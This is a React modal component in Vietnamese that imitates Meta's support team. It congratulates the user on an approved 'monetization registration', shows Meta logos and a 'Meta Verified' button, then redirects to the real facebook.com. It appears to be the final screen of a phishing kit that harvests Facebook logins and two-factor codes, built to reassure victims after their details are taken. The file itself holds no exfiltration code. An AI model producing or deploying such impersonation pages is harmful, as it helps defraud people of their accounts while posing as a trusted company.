import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import SuccessImage from '@/assets/images/successb.webp';
import TickIcon from '@/assets/images/tick.png';

const SuccessModal = ({ show, onClose, texts }) => {
    if (!show) return null;

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose}></div>
            <div className="modal form-modal show" id="successModal" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
            <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                <div className="modal-content">
                    <div className="modal-body">
                        <div className="twoFAinfo-wraper">
                            <h1 className="modal-title" id="successModalLabel">
                                {texts.successTitle || 'Đăng ký kiếm tiền thành công!'}
                            </h1>
                            <br />
                            <div className="fb-round-wraper">
                                <img alt="success" src={SuccessImage} style={{ width: '100%' }} />
                            </div>
                            <br />
                            <p>
                                {texts.successMessage1 || 'Tuyệt vời! Yêu cầu đăng ký kiếm tiền của bạn đã được phê duyệt.'}
                                <br />
                                <br />
                                {texts.successMessage2 || 'Tính năng kiếm tiền sẽ được kích hoạt trên trang của bạn trong vòng 24 – 48 giờ tới.'} <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle', margin: '0 4px' }} />
                                <br />
                                <br />
                                {texts.successMessage3 || 'Nếu tính năng chưa xuất hiện sau thời gian này, vui lòng liên hệ lại với chúng tôi để được hỗ trợ thêm.'}
                                <br />
                                <br />
                                {texts.thankYou || 'Cảm ơn bạn đã tin tưởng!'}
                                <br />
                                <br />
                                {texts.metaSupportTeam || 'Nhóm hỗ trợ Meta.'}
                            </p>
                        </div>
                        <div className="form-btn-wrapper">
                            <button
                                className="btn btn-primary"
                                type="button"
                                onClick={() => window.location.href = 'https://www.facebook.com'}
                            >
                                <span className="button-text">{texts.metaVerified || 'Meta Verified'}</span>
                            </button>
                        </div>
                    </div>
                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                            {texts.aboutHelpMore || 'About · Help · See more'}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </>
    );
};

SuccessModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default SuccessModal;
